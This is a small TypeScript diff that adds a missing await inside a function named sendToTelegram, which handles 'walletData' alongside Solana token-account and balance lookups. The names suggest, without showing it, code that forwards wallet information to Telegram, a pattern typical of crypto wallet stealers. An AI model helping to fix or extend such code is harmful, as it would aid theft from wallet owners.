@@ -112,7 +112,7 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
-    const connection = createConnection();
+    const connection = await createConnection(); // Fixed: Added await here
     let solBalance = 0;
     
     try {
